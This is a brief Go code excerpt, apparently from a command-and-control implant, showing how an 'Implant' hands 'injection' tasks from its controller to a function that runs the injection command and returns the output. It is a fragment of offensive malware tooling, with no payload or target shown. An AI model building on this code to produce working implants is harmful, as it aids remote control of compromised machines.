...
func (i *Implant) handleTask(packet *protocol.Packet) {
	...
	// Handle injection tasks
	if task.TaskType == "injection" {
		result = i.handleInjectionTask(task.Data)
	} else {
...
func (i *Implant) handleInjectionTask(cmdJSON string) *executor.ExecutionResult {
	result := &executor.ExecutionResult{
		ExitCode: 0,
	}

	// Execute the injection command
	cmdResult, err := injection.ExecuteCommand(cmdJSON)
	if err != nil {
		result.ExitCode = -1
	...
	result.Output = string(resultJSON)
